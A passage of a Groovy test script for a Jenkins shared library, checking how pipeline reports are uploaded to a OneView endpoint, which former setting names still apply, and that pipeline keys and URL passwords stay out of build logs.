 [rule : 'rule 4, both names with the same label: ONEVIEW_AGENT is used and one line says that DSO_PORTAL_AGENT can be removed',
  env  : [ONEVIEW_AGENT: 'reader', DSO_PORTAL_AGENT: ' reader '], node: 'node reader', notices: [removableLine('DSO_PORTAL_AGENT', 'ONEVIEW_AGENT')]]
].each { Map spec ->
    Map read = readWith(spec.env as Map)
    check("bootstrap agent, ${spec.rule}", !read.error && read.node == spec.node && read.notices == spec.notices && read.address == OneViewFixtures.ONEVIEW_URL,
            "${read.error} | ${read.node} | ${read.notices}")
}
Map windowsRead = readWith([DSO_PORTAL_AGENT: 'portal-reader'], true)
check('bootstrap agent: a Windows agent named by DSO_PORTAL_AGENT is refused with the new name of the setting to change',
        (windowsRead.error as String).contains('set ONEVIEW_AGENT to a Linux or macOS label') && windowsRead.node == 'node portal-reader' && windowsRead.notices == [renameLine('DSO_PORTAL_AGENT', 'ONEVIEW_AGENT')],
        "${windowsRead.error} | ${windowsRead.node} | ${windowsRead.notices}")
Map inNode = readWith([NODE_NAME: 'build-agent-7', WORKSPACE: '/agent/ws', DSO_PORTAL_AGENT: 'portal-reader'])
check('bootstrap agent: a read in place inside a node asks for no agent and logs no line about DSO_PORTAL_AGENT',
        !inNode.error && !inNode.node && !inNode.notices, "${inNode.error} | ${inNode.node} | ${inNode.notices}")

j = jenkins([ONEVIEW_URL: null, DSO_PORTAL_URL: formerAddress, DSO_PORTAL_AGENT: 'linux-agent', DSO_PIPELINE_KEY: 'pipe-key-99'])
j.files['report/pipeline-report.html'] = reportHtml
keys = [OneViewFixtures.publish(j, gui), OneViewFixtures.publish(j, backend)]
boolean sharedNotices = false
boolean sharedKeys = false
boolean takenOver = false
run = apiRun(j) { fake ->
    fake.configure('full', [pipelineKeys: keys])
    fake.configure('full', [pipelineKeys: keys])
    j.onAgent('linux-agent') {
        fake.initialize()
        fake.sendOneViewReport('full')
        fake.sendPortalReport('full')
    }
}
if (!run.error) {
    new SandboxHarness(srcDir, stubDir).run {
        def branch = run.state.fork()
        sharedNotices = branch.oneViewNotices.is(run.state.oneViewNotices)
        sharedKeys = branch.oneViewKeys.is(run.state.oneViewKeys) && run.state.oneViewKeys == keys
        def rereadBranch = run.state.fork()
        rereadBranch.oneViewKeys = [keys[0]]
        run.state.absorb(rereadBranch)
        takenOver = run.state.oneViewKeys == [keys[0]]
    }
}
List<String> addresses = j.calls.findAll { it.startsWith('withEnv [ONEVIEW_') }.collect { ((it =~ /ONEVIEW_URL=([^,\]]*)/)[0] as List)[1] as String }
check('one place resolves the address: two configuration reads and two report uploads of one build use the same address, each line about a former name is logged once per build, a parallel branch shares the list of logged lines and the keys of the run, and the keys of a branch that read its configuration again are taken over',
        !run.error && addresses == [formerAddress] * 4 && notices(j) == [renameLine('DSO_PORTAL_URL', 'ONEVIEW_URL'), renameLine('DSO_PORTAL_AGENT', 'ONEVIEW_AGENT')] && sharedNotices && sharedKeys && takenOver,
        "${run.error} | ${addresses} | ${notices(j)} | ${sharedNotices} | ${sharedKeys} | ${takenOver}")

List<String> everyNotice = []
Closure upload = { Map env, Map blocks = [:], Map options = [:] ->
    FakeScript s = jenkins([ONEVIEW_URL: null, DSO_PIPELINE_KEY: 'pipe-key-99', BUILD_NUMBER: '42', JOB_NAME: 'CertScanner-build'] + env)
    s.files[(options.file ?: 'devsecops_config.yaml') as String] = configWith { Map p -> (p.gui as Map).putAll(OneViewFixtures.copy(blocks)) }
    if (options.defaults) {
        Map libraryDefaults = yaml.load(defaultsText) as Map
        (libraryDefaults.defaults as Map).putAll(OneViewFixtures.copy(options.defaults as Map))
        s.resources['com/bbh/devsecops/defaults.yaml'] = yaml.dump(libraryDefaults)
    }
    s.files['report/pipeline-report.html'] = reportHtml
    if (options.windows) s.unix = false
    List<Map> posts = []
    recordPosts(s, posts, options.failFor as Closure)
    Map result = apiRun(s) { fake ->
        fake.configure('full', agents + [projectNames: 'gui'])
        s.onAgent(options.windows ? 'windows-agent' : 'linux-agent') {
            fake.initialize()
            fake.stagePass('Build artifact')
            fake.stagePass('Unit tests')
            ((options.times ?: 1) as int).times {
                if (options.formerCall) fake.sendPortalReport('full') else fake.sendOneViewReport('full')
            }
        }
    }
    everyNotice.addAll(notices(s))
    [j: s, error: result.error, address: addressIn(s, 'ONEVIEW_URL'), notices: notices(s), leak: leaks(s, result.error), posts: posts,
     payload: s.jsonFiles.find { it.key.startsWith('oneview_report_') }?.value as Map,
     sent: s.calls.find { it.contains('/api/dso/reports') } ?: '']
}

Map sent = upload([ONEVIEW_URL: 'https://oneview.bbh.com:8443/'])
check('OneView report upload: build status, tally and pipeline-report.html are sent to ONEVIEW_URL, which reaches curl through the environment with the payload and response files, curl gives up after 10 seconds without a connection and after 60 seconds in all, the answer is printed without the pipeline key, and both files are removed',
        !sent.error && sent.address == 'https://oneview.bbh.com:8443' && sent.sent == '''sh set +x
code=$(curl -sS -k --connect-timeout 10 --max-time 60 -o "$ONEVIEW_RESPONSE" -w '%{http_code}' -X POST "$ONEVIEW_URL/api/dso/reports" -H "Content-Type: application/json" --data-binary "@$ONEVIEW_FILE")
rc=$?
if [ $rc -ne 0 ]; then
  exit $rc
fi
echo "[ONEVIEW] HTTP $code $(sed 's/"pipelineKey" *: *"[^"]*"/"pipelineKey":"(not shown)"/g' "$ONEVIEW_RESPONSE" 2>/dev/null)"
if [ "$code" -ge 300 ]; then
  exit 1
fi
'''
                && sent.payload?.pipelineKey == 'pipe-key-99'
                && sent.payload?.job == 'CertScanner-build'
                && sent.payload?.build == 42L
                && sent.payload?.reportHtml == reportHtml
                && sent.payload?.stagesTotal == 2L
                && sent.payload?.passed == 2L
                && (sent.j as FakeScript).calls.any { it ==~ /withEnv \[ONEVIEW_URL=https:\/\/oneview\.bbh\.com:8443, ONEVIEW_FILE=oneview_report_(\d+)\.json, ONEVIEW_RESPONSE=oneview_response_\1\.json\]/ }
                && (sent.j as FakeScript).calls.any { it ==~ /sh rm -f 'oneview_report_(\d+)\.json' 'oneview_response_\1\.json'/ }
                && (sent.j as FakeScript).log.contains(uploadingLine('https://oneview.bbh.com:8443/api/dso/reports'))
                && !sent.notices && !(sent.j as FakeScript).calls.any { it.contains('PORTAL') || it.contains('portal_') },
        "${sent.error} | ${sent.sent} | ${sent.payload} | ${sent.notices}")

Map sentOnWindows = upload([ONEVIEW_URL: 'https://oneview.bbh.com:8443'], [:], [windows: true])
check('OneView report upload on Windows: the same environment reaches curl.exe with the same two time limits, the answer is printed without the pipeline key, and both files are removed',
        !sentOnWindows.error && sentOnWindows.sent == '''powershell $code = curl.exe -sS -k --connect-timeout 10 --max-time 60 -o "$env:ONEVIEW_RESPONSE" -w '%{http_code}' -X POST "$env:ONEVIEW_URL/api/dso/reports" -H "Content-Type: application/json" --data-binary "@$env:ONEVIEW_FILE"
if ($LASTEXITCODE) { exit $LASTEXITCODE }
$answer = (Get-Content -Raw $env:ONEVIEW_RESPONSE -ErrorAction SilentlyContinue) -replace '"pipelineKey" *: *"[^"]*"', '"pipelineKey":"(not shown)"'
Write-Host "[ONEVIEW] HTTP $code $answer"
if ([int]$code -ge 300) { exit 1 }
'''
                && (sentOnWindows.j as FakeScript).calls.any { it ==~ /powershell Remove-Item -Force 'oneview_report_(\d+)\.json', 'oneview_response_\1\.json' -ErrorAction SilentlyContinue/ },
        "${sentOnWindows.error} | ${sentOnWindows.sent}")

Map sentByFormerCall = upload([ONEVIEW_URL: 'https://oneview.bbh.com:8443'], [:], [formerCall: true])
check('devSecOpsApi.sendPortalReport() of a custom Jenkinsfile is an alias of sendOneViewReport(): the same upload with the same payload',
        !sentByFormerCall.error && sentByFormerCall.sent == sent.sent && sentByFormerCall.address == sent.address
                && sentByFormerCall.payload?.findAll { k, v -> k != 'durationSeconds' } == sent.payload?.findAll { k, v -> k != 'durationSeconds' },
        "${sentByFormerCall.error} | ${sentByFormerCall.sent}")

Map bothBlocks = [oneview: [url: 'https://four.bbh.com'], portal: [url: 'https://five.bbh.com']]
[[order: 'ONEVIEW_URL comes first, and one line each says that DSO_PORTAL_URL and PORTAL_URL with another address are ignored',
  env  : [ONEVIEW_URL: 'https://one.bbh.com', DSO_PORTAL_URL: 'https://two.bbh.com', PORTAL_URL: 'https://three.bbh.com'], blocks: bothBlocks,
  address: 'https://one.bbh.com', notices: [shadowedLine('DSO_PORTAL_URL', 'ONEVIEW_URL'), shadowedLine('PORTAL_URL', 'ONEVIEW_URL')]],
 [order: 'DSO_PORTAL_URL comes second, before PORTAL_URL as it did, with the line that says how to rename it',
  env  : [DSO_PORTAL_URL: 'https://two.bbh.com', PORTAL_URL: 'https://three.bbh.com'], blocks: bothBlocks,
  address: 'https://two.bbh.com', notices: [renameLine('DSO_PORTAL_URL', 'ONEVIEW_URL')]],
 [order: 'PORTAL_URL comes third, with the line that says how to rename it',
  env  : [PORTAL_URL: 'https://three.bbh.com/'], blocks: bothBlocks,
  address: 'https://three.bbh.com', notices: [renameLine('PORTAL_URL', 'ONEVIEW_URL')]],
 [order: 'the configured oneview.url comes fourth, and one line says that portal.url with another address is ignored',
  env  : [:], blocks: bothBlocks,
  address: 'https://four.bbh.com', notices: [shadowedLine('portal.url', 'oneview.url')]],
 [order: 'the configured portal.url comes last and still works, with the line that says to rename the block in the file the run read (rule 2)',
  env  : [:], blocks: [portal: [url: 'https://five.bbh.com/']],
  address: 'https://five.bbh.com', notices: [renameBlockLine('portal.url', 'oneview.url', inFile)]],
 [order: 'a run that read config.yaml names config.yaml as the place of the block',
  env  : [:], blocks: [portal: [url: 'https://five.bbh.com/']], file: 'config.yaml',
  address: 'https://five.bbh.com', notices: [renameBlockLine('portal.url', 'oneview.url', 'in config.yaml')]],
 [order: 'a portal.url of the library defaults still works when no service sets one, and the line names the defaults file of the library as the place of the block',
  env  : [:], blocks: [:], defaults: [portal: [url: 'https://five.bbh.com']],
  address: 'https://five.bbh.com', notices: [renameBlockLine('portal.url', 'oneview.url', inLibrary)]],
 [order: 'the oneview.url of the library defaults comes before the portal.url of a service',
  env  : [:], blocks: [portal: [url: 'https://five.bbh.com']], defaults: [oneview: [url: 'https://four.bbh.com']],
  address: 'https://four.bbh.com', notices: [shadowedLine('portal.url', 'oneview.url')]],
 [order: 'oneview.url and portal.url with the same address: one line says that portal.url can be removed from the file (rule 4)',
  env  : [:], blocks: [oneview: [url: 'https://four.bbh.com'], portal: [url: 'https://four.bbh.com/']],
  address: 'https://four.bbh.com', notices: [removableLine('portal.url', 'oneview.url', inFile)]],
 [order: 'oneview.url and portal.url of the library defaults with the same address: the line names the defaults file of the library (rule 4)',
  env  : [:], blocks: [:], defaults: [oneview: [url: 'https://four.bbh.com'], portal: [url: 'https://four.bbh.com']],
  address: 'https://four.bbh.com', notices: [removableLine('portal.url', 'oneview.url', inLibrary)]],
 [order: 'ONEVIEW_URL, DSO_PORTAL_URL and PORTAL_URL with the same address: one line each says that DSO_PORTAL_URL and PORTAL_URL can be removed (rule 4)',
  env  : [ONEVIEW_URL: 'https://one.bbh.com', DSO_PORTAL_URL: 'https://one.bbh.com/', PORTAL_URL: ' https://one.bbh.com'], blocks: bothBlocks,
  address: 'https://one.bbh.com', notices: [removableLine('DSO_PORTAL_URL', 'ONEVIEW_URL'), removableLine('PORTAL_URL', 'ONEVIEW_URL')]],
 [order: 'an ONEVIEW_URL with a password and an empty DSO_PORTAL_URL are ignored with their reasons and PORTAL_URL is used (rules 3 and 5)',
  env  : [ONEVIEW_URL: withSecret, DSO_PORTAL_URL: '', PORTAL_URL: 'https://three.bbh.com'], blocks: bothBlocks,
  address: 'https://three.bbh.com', notices: [ignoredLine('ONEVIEW_URL', notAnAddressReason, 'PORTAL_URL, its former name,'), ignoredLine('DSO_PORTAL_URL', 'it is blank', 'PORTAL_URL')]],
 [order: 'an ONEVIEW_URL with a password is ignored with its reason and DSO_PORTAL_URL is used (rules 3 and 5)',
  env  : [ONEVIEW_URL: withSecret, DSO_PORTAL_URL: 'https://two.bbh.com', PORTAL_URL: 'https://three.bbh.com'], blocks: bothBlocks,
  address: 'https://two.bbh.com', notices: [ignoredLine('ONEVIEW_URL', notAnAddressReason, 'DSO_PORTAL_URL, its former name,')]],
 [order: 'a blank ONEVIEW_URL, DSO_PORTAL_URL and PORTAL_URL are ignored with their reason and the configured oneview.url is used (rule 3)',
  env  : [ONEVIEW_URL: ' ', DSO_PORTAL_URL: '/', PORTAL_URL: ''], blocks: bothBlocks,
  address: 'https://four.bbh.com', notices: [ignoredLine('ONEVIEW_URL', 'it is blank', 'oneview.url'), ignoredLine('DSO_PORTAL_URL', 'it is blank', 'oneview.url'),
                                              ignoredLine('PORTAL_URL', 'it is blank', 'oneview.url'), shadowedLine('portal.url', 'oneview.url')]],
 [order: 'an oneview.url with a password is ignored with its reason and the place to correct it, and portal.url is used (rules 3 and 5)',
  env  : [:], blocks: [oneview: [url: withSecret], portal: [url: 'https://five.bbh.com']],
  address: 'https://five.bbh.com', notices: [ignoredLine('oneview.url', notAnAddressReason, 'portal.url, its former name,', inFile)]],
 [order: 'an oneview.url of the library defaults that is not an address is ignored with the defaults file of the library as the place to correct it, and the portal.url of the service is used (rules 3 and 5)',
  env  : [:], blocks: [portal: [url: 'https://five.bbh.com']], defaults: [oneview: [url: 'ftp://reader:s3cret@files.bbh.com']],
  address: 'https://five.bbh.com', notices: [ignoredLine('oneview.url', notAnAddressReason, 'portal.url, its former name,', inLibrary)]],
 [order: 'a blank oneview.url is ignored because it is blank, portal.url is used, and no line advises to rename the block (rule 3)',
  env  : [:], blocks: [oneview: [url: ''], portal: [url: 'https://five.bbh.com']],
  address: 'https://five.bbh.com', notices: [ignoredLine('oneview.url', 'it is blank', 'portal.url, its former name,', inFile)]],
 [order: 'a blank oneview.url of the service is ignored and the portal.url of the library defaults is used (rule 3)',
  env  : [:], blocks: [oneview: [url: '  ']], defaults: [portal: [url: 'https://five.bbh.com']],
  address: 'https://five.bbh.com', notices: [ignoredLine('oneview.url', 'it is blank', 'portal.url, its former name,', inFile)]],
 [order: 'a blank oneview.url of the service leaves the oneview.url of the library defaults in force, as a blank portal.url did, without a line',
  env  : [:], blocks: [oneview: [url: '']], defaults: [oneview: [url: 'https://four.bbh.com']],
  address: 'https://four.bbh.com', notices: []],
 [order: 'a blank portal.url next to a valid oneview.url is passed over without a line',
  env  : [:], blocks: [oneview: [url: 'https://four.bbh.com'], portal: [url: ' ']],
  address: 'https://four.bbh.com', notices: []]
].each { Map spec ->
    Map result = upload(spec.env as Map, spec.blocks as Map, [defaults: spec.defaults, file: spec.file])
    check("report upload order: ${spec.order}",
            !result.error && result.address == spec.address && result.notices == spec.notices && !result.leak && result.posts*.address == [spec.address]
                    && (result.j as FakeScript).log.contains(uploadingLine("${spec.address}/api/dso/reports".toString())),
            "${result.error} | ${result.address} | ${result.notices}")
}

Closure formerValues = { ->
    Map<String, String> values = ['an underscore in the host'       : 'http://dso_portal:8080',
                                  'an upper-case scheme'            : 'HTTPS://dso-portal.apps.bbh.com',
                                  'an IPv6 literal'                 : 'http://[2001:db8::7]:8080',
                                  'an escaped character in the path': 'https://tools.bbh.com/dso%2Dportal',
                                  'no scheme'                       : 'dso-portal.apps.bbh.com:8080',
                                  'a user and a password'           : 'https://reader:s3cret@dso-portal.apps.bbh.com',
                                  'a query'                         : 'https://dso-portal.apps.bbh.com/?token=s3cret']
    Closure beforeTheRename = { String value -> value.trim().replaceAll('/+$', '') }
    values.each { String what, String value ->
        String written = what == 'a query' ? " ${value} ".toString() : " ${value}// ".toString()
        [[name: 'DSO_PORTAL_URL', env: [DSO_PORTAL_URL: written], blocks: [:], is: 'ONEVIEW_URL', place: variablePlace],
         [name: 'PORTAL_URL', env: [PORTAL_URL: written], blocks: [:], is: 'ONEVIEW_URL', place: variablePlace],
         [name: 'portal.url', env: [:], blocks: [portal: [url: written]], is: 'oneview.url', place: inFile]
        ].each { Map former ->
            Map result = upload(former.env as Map, former.blocks as Map)
            FakeScript s = result.j as FakeScript
            check("report upload, a former name keeps the address it had: ${former.name} with ${what} is used as before the rename, no line, message or step prints it, " +
                    "the upload line names ${former.name} instead, and the line about the former name does not advise a plain rename",
                    !result.error && result.posts*.address == [beforeTheRename(value)] && value == beforeTheRename(value) && result.posts*.key == ['pipe-key-99']
                            && !printed(s, result.error, value) && !printed(s, result.error, value.replaceAll(/^[A-Za-z]+:\/\//, ''))
                            && s.log.contains(uploadingLine(namedTarget(former.name as String)))
                            && result.notices == [formerValueLine(former.name as String, former.is as String, former.place as String)]
                            && !s.log.any { it.contains('rename it') || it.contains('rename the block') },
                    "${result.error} | ${result.posts*.address} | ${result.notices} | ${s.log.findAll { it.startsWith('[ONEVIEW]') }}")
        }
        Map refusedVariable = upload([ONEVIEW_URL: written], [portal: [url: 'https://five.bbh.com']])
        check("report upload, a new name needs the strict form: ONEVIEW_URL with ${what} is ignored with the reason, never used and never printed, and portal.url is used",
                !refusedVariable.error && refusedVariable.posts*.address == ['https://five.bbh.com']
                        && refusedVariable.notices == [ignoredLine('ONEVIEW_URL', notAnAddressReason, 'portal.url'), renameBlockLine('portal.url', 'oneview.url', inFile)]
                        && !((refusedVariable.j as FakeScript).log + (refusedVariable.j as FakeScript).calls).any { it.contains(value) },
                "${refusedVariable.error} | ${refusedVariable.posts*.address} | ${refusedVariable.notices}")
        Map refusedSetting = upload([:], [oneview: [url: written]])
        check("report upload, a new name needs the strict form: oneview.url with ${what} and nothing behind it uploads nothing, one line names oneview.url and ONEVIEW_URL, and the value is never printed",
                !refusedSetting.error && !refusedSetting.posts && refusedSetting.notices == [notUploadedLine(['oneview.url'])]
                        && !((refusedSetting.j as FakeScript).log + (refusedSetting.j as FakeScript).calls).any { it.contains(value) },
                "${refusedSetting.error} | ${refusedSetting.posts*.address} | ${refusedSetting.notices}")
    }
    Map shadowing = upload([DSO_PORTAL_URL: 'http://dso_portal:8080', PORTAL_URL: 'https://three.bbh.com'], bothBlocks)
    check('report upload, a former name keeps the address it had: a DSO_PORTAL_URL with an underscore in its host still comes before PORTAL_URL, as before the rename',
            !shadowing.error && shadowing.posts*.address == ['http://dso_portal:8080'] && shadowing.notices == [formerValueLine('DSO_PORTAL_URL', 'ONEVIEW_URL', variablePlace)],
            "${shadowing.error} | ${shadowing.posts*.address} | ${shadowing.notices}")
    Map newWins = upload([ONEVIEW_URL: 'https://one.bbh.com', DSO_PORTAL_URL: 'https://reader:s3cret@dso-portal.apps.bbh.com', PORTAL_URL: 'http://dso_portal:8080'])
    check('report upload, rule 1: a valid ONEVIEW_URL wins over former names that hold other values, whose values are not printed',
            !newWins.error && newWins.posts*.address == ['https://one.bbh.com'] && !newWins.leak && !printed(newWins.j as FakeScript, newWins.error, 'dso_portal')
                    && newWins.notices == [shadowedLine('DSO_PORTAL_URL', 'ONEVIEW_URL'), shadowedLine('PORTAL_URL', 'ONEVIEW_URL')],
            "${newWins.error} | ${newWins.posts*.address} | ${newWins.notices}")
    Map ignoredNew = upload([ONEVIEW_URL: 'oneview.apps.bbh.com', PORTAL_URL: 'https://reader:s3cret@dso-portal.apps.bbh.com'])
    check('report upload, rule 3: an ONEVIEW_URL without a scheme is ignored with the reason and a PORTAL_URL with a password is used as before, and neither value is printed',
            !ignoredNew.error && ignoredNew.posts*.address == ['https://reader:s3cret@dso-portal.apps.bbh.com']
                    && ignoredNew.notices == [ignoredLine('ONEVIEW_URL', notAnAddressReason, 'PORTAL_URL, its former name,')]
                    && !printed(ignoredNew.j as FakeScript, ignoredNew.error, 's3cret') && !printed(ignoredNew.j as FakeScript, ignoredNew.error, 'oneview.apps.bbh.com')
                    && (ignoredNew.j as FakeScript).log.contains(uploadingLine(namedTarget('PORTAL_URL'))),
            "${ignoredNew.error} | ${ignoredNew.posts*.address} | ${ignoredNew.notices}")
    Map failing = upload([DSO_PORTAL_URL: 'https://reader:s3cret@dso-portal.apps.bbh.com'], [:], [failFor: { key, url -> true }])
    check('report upload, rule 5: a failed upload to an address that is not of the strict form names DSO_PORTAL_URL in its line, not the address, and the build goes on',
            !failing.error && failing.posts.size() == 1 && !printed(failing.j as FakeScript, failing.error, 's3cret')
                    && (failing.j as FakeScript).log.contains('[ONEVIEW] Failed to upload pipeline report to OneView: script returned exit code 22 after the address in DSO_PORTAL_URL/api/dso/reports answered')
                    && (failing.j as FakeScript).currentBuild.result == null,
            "${failing.error} | ${(failing.j as FakeScript).log.findAll { it.startsWith('[ONEVIEW]') }}")
    Map failingStrict = upload([ONEVIEW_URL: 'https://one.bbh.com'], [:], [failFor: { key, url -> true }])
    check('report upload: a failed upload is one [ONEVIEW] line with the reason, the files are removed and the result of the build stays as it was',
            !failingStrict.error && (failingStrict.j as FakeScript).currentBuild.result == null
                    && (failingStrict.j as FakeScript).log.findAll { it.startsWith('[ONEVIEW] Failed') } == ['[ONEVIEW] Failed to upload pipeline report to OneView: script returned exit code 22 after https://one.bbh.com/api/dso/reports answered']
                    && (failingStrict.j as FakeScript).calls.any { it.startsWith("sh rm -f 'oneview_report_") },
            "${failingStrict.error} | ${(failingStrict.j as FakeScript).log.findAll { it.startsWith('[ONEVIEW]') }}")
}
formerValues()

Map nowhere = upload([:])
check('report upload: without an address in any of the five places nothing is uploaded and nothing is logged, as before',
        !nowhere.error && !nowhere.sent && !nowhere.payload && !(nowhere.j as FakeScript).log.any { it.startsWith('[ONEVIEW]') }, "${nowhere.error} | ${nowhere.sent} | ${(nowhere.j as FakeScript).log.findAll { it.startsWith('[ONEVIEW]') }}")
Map blankSetting = upload([:], [oneview: [url: '  '], portal: [url: '/']])
check('report upload: a blank oneview.url or portal.url with nothing usable behind it counts as not set - nothing is uploaded and nothing is logged',
        !blankSetting.error && !blankSetting.sent && !blankSetting.payload && !(blankSetting.j as FakeScript).log.any { it.startsWith('[ONEVIEW]') },
        "${blankSetting.error} | ${blankSetting.sent} | ${(blankSetting.j as FakeScript).log.findAll { it.startsWith('[ONEVIEW]') }}")
Map refusedEverywhere = upload([ONEVIEW_URL: withSecret], [oneview: [url: 'ftp://reader:s3cret@files.bbh.com']])
check('report upload, rules 3 and 5: when no place holds an address the build goes on without the upload, one line names the places and ONEVIEW_URL, and no value is repeated',
        !refusedEverywhere.error && !refusedEverywhere.sent && !refusedEverywhere.payload && !refusedEverywhere.leak
                && refusedEverywhere.notices == [notUploadedLine(['ONEVIEW_URL', 'oneview.url'])],
        "${refusedEverywhere.error} | ${refusedEverywhere.sent} | ${refusedEverywhere.notices}")
Map blankEverywhere = upload([ONEVIEW_URL: ' ', DSO_PORTAL_URL: '  '], [oneview: [url: ' ']])
check('report upload: variables that are blank are named when no place holds an address, and a blank setting is not, because it counts as not set',
        !blankEverywhere.error && !blankEverywhere.sent && !blankEverywhere.posts
                && blankEverywhere.notices == [notUploadedLine(['ONEVIEW_URL', 'DSO_PORTAL_URL'])],
        "${blankEverywhere.error} | ${blankEverywhere.sent} | ${blankEverywhere.notices}")
Map noPipelineKey = upload([DSO_PIPELINE_KEY: null, DSO_PORTAL_URL: formerAddress, DSO_PORTAL_AGENT: 'portal-reader'])
check('report upload: a run without a pipeline key uploads nothing and logs no line about the former names of a Jenkins that other jobs use with a key',
        !noPipelineKey.error && !noPipelineKey.sent && !(noPipelineKey.j as FakeScript).log.any { it.startsWith('[ONEVIEW]') },
        "${noPipelineKey.error} | ${(noPipelineKey.j as FakeScript).log.findAll { it.startsWith('[ONEVIEW]') }}")

Map address = [ONEVIEW_URL: OneViewFixtures.ONEVIEW_URL]
[[rule : 'DSO_PIPELINE_KEY of the job comes first, as before, and no line names a configured key',
  env  : address, blocks: [oneview: [pipelineKey: 'key-of-oneview-block'], portal: [pipelineKey: 'key-of-portal-block']], key: 'pipe-key-99', notices: []],
 [rule : 'DSO_PIPELINE_KEY comes before a PIPELINE_KEY with another value',
  env  : address + [PIPELINE_KEY: 'pipe-key-77'], blocks: [:], key: 'pipe-key-99', notices: []],
 [rule : 'PIPELINE_KEY of the job comes second, as before',
  env  : address + [DSO_PIPELINE_KEY: null, PIPELINE_KEY: ' pipe-key-77 '], blocks: [portal: [pipelineKey: 'key-of-portal-block']], key: 'pipe-key-77', notices: []],
 [rule : 'a DSO_PIPELINE_KEY of spaces counts as not set and PIPELINE_KEY is used',
  env  : address + [DSO_PIPELINE_KEY: '  ', PIPELINE_KEY: 'pipe-key-77'], blocks: [portal: [pipelineKey: 'key-of-portal-block']], key: 'pipe-key-77', notices: []],
 [rule : 'rule 1: oneview.pipelineKey wins, and one line says that portal.pipelineKey with another value is ignored',
  env  : address + [DSO_PIPELINE_KEY: null], blocks: [oneview: [pipelineKey: 'key-of-oneview-block'], portal: [pipelineKey: 'key-of-portal-block']], key: 'key-of-oneview-block',
  notices: [shadowedLine('portal.pipelineKey', 'oneview.pipelineKey')]],
 [rule : 'rule 2: portal.pipelineKey alone still works, and one line says to rename the block in the file the run read',
  env  : address + [DSO_PIPELINE_KEY: null], blocks: [portal: [pipelineKey: ' key-of-portal-block ']], key: 'key-of-portal-block',
  notices: [renameBlockLine('portal.pipelineKey', 'oneview.pipelineKey', inFile)]],
 [rule : 'rule 2: a portal.pipelineKey of the library defaults still works, and the line names the defaults file of the library',
  env  : address + [DSO_PIPELINE_KEY: null], blocks: [:], defaults: [portal: [pipelineKey: 'key-of-portal-block']], key: 'key-of-portal-block',
  notices: [renameBlockLine('portal.pipelineKey', 'oneview.pipelineKey', inLibrary)]],
 [rule : 'rule 3: a blank oneview.pipelineKey is ignored because it is blank, portal.pipelineKey is used, and no line advises to rename the block',
  env  : address + [DSO_PIPELINE_KEY: null], blocks: [oneview: [pipelineKey: ' '], portal: [pipelineKey: 'key-of-portal-block']], key: 'key-of-portal-block',
  notices: [ignoredLine('oneview.pipelineKey', 'it is blank', 'portal.pipelineKey, its former name,', inFile)]],
 [rule : 'rule 4: both blocks with the same key, one line says that portal.pipelineKey can be removed from the file',
  env  : address + [DSO_PIPELINE_KEY: null], blocks: [oneview: [pipelineKey: 'key-of-both-blocks'], portal: [pipelineKey: 'key-of-both-blocks']], key: 'key-of-both-blocks',
  notices: [removableLine('portal.pipelineKey', 'oneview.pipelineKey', inFile)]]
].each { Map spec ->
    Map result = upload(spec.env as Map, spec.blocks as Map, [defaults: spec.defaults])
    check("pipeline key of the report upload, ${spec.rule}; the key is in the payload only (rule 5)",
            !result.error && result.posts*.key == [spec.key] && result.notices == spec.notices
                    && !((result.j as FakeScript).log + (result.j as FakeScript).calls).any { it.contains('key-of-') || it.contains('pipe-key-') },
            "${result.error} | ${result.posts*.key} | ${result.notices}")
}
Map blankKey = upload(address + [DSO_PIPELINE_KEY: null], [oneview: [pipelineKey: ' ']])
check('pipeline key of the report upload: a blank oneview.pipelineKey with no portal.pipelineKey behind it counts as not set - nothing is uploaded and nothing is logged',
        !blankKey.error && !blankKey.posts && !(blankKey.j as FakeScript).log.any { it.startsWith('[ONEVIEW]') },
        "${blankKey.error} | ${blankKey.posts} | ${(blankKey.j as FakeScript).log.findAll { it.startsWith('[ONEVIEW]') }}")
Map blockOnly = upload([DSO_PIPELINE_KEY: null], [portal: [url: 'https://five.bbh.com', pipelineKey: 'key-of-portal-block']])
check('a service that configures the upload only with its portal: block (url and pipelineKey) still uploads, with one line per key that says to rename the block in the file the run read',
        !blockOnly.error && blockOnly.address == 'https://five.bbh.com' && blockOnly.payload?.pipelineKey == 'key-of-portal-block'
                && blockOnly.notices == [renameBlockLine('portal.pipelineKey', 'oneview.pipelineKey', inFile), renameBlockLine('portal.url', 'oneview.url', inFile)],
        "${blockOnly.error} | ${blockOnly.address} | ${blockOnly.notices}")

List<String> keyedNotices = []
Closure keyedUpload = { Map env, List<Map> documents, Map options = [:] ->
    FakeScript s = jenkins([BUILD_NUMBER: '42', JOB_NAME: 'CertScanner-build'] + env)
    s.files['report/pipeline-report.html'] = reportHtml
    List<String> own = documents.collect { OneViewFixtures.publish(s, it) }
    List given = options.given ? (options.given as Closure).call(own) as List : own
    List<Map> posts = []
    recordPosts(s, posts, options.failFor as Closure)
    Map result = apiRun(s) { fake ->
        ((options.reads ?: 1) as int).times { fake.configure('full', given.size() == 1 ? [pipelineKey: given[0]] : [pipelineKeys: given]) }
        s.onAgent('linux-agent') {
            fake.initialize()
            if (options.beforeUpload) (options.beforeUpload as Closure).call(s)
            ((options.times ?: 1) as int).times { fake.sendOneViewReport('full') }
        }
    }
    keyedNotices.addAll(notices(s))
    [j: s, error: result.error, keys: own, posts: posts, notices: notices(s), state: result.state,
     lines: s.log.findAll { it.startsWith('[ONEVIEW] Uploading') || it.startsWith('[ONEVIEW] Failed') },
     keyPrinted: (s.log + [String.valueOf(result.error), String.valueOf(s.currentBuild.description)] + s.calls.findAll { !it.startsWith('withEnv [ONEVIEW_DIR=') }).any { String line -> own.any { line.contains(it) } }]
}
String oneViewTarget = "${OneViewFixtures.ONEVIEW_URL}/api/dso/reports".toString()
Closure keysOfTheJenkinsfile = { ->
    Map one = keyedUpload([:], [gui])
    check('report upload with the key of the Jenkinsfile: a run that read its configuration with one pipelineKey uploads its report with that key and no further setting, the line shows the hint of the key, and the key itself is in the payload only',
            !one.error && one.posts*.key == one.keys && one.posts*.address == [OneViewFixtures.ONEVIEW_URL] && one.posts*.html == [reportHtml]
                    && one.lines == [uploadingLine(oneViewTarget, OneViewFixtures.hint(one.keys[0] as String))] && !one.notices && !one.keyPrinted
                    && (one.j as FakeScript).calls.count { it.startsWith("sh rm -f 'oneview_report_") } == 1,
            "${one.error} | ${one.posts*.key} | ${one.lines} | ${one.notices} | printed ${one.keyPrinted}")
    Map several = keyedUpload([:], [backend, gui], [given: { List own -> [' ' + (own[0] as String).toUpperCase() + ' ', own[1]] }])
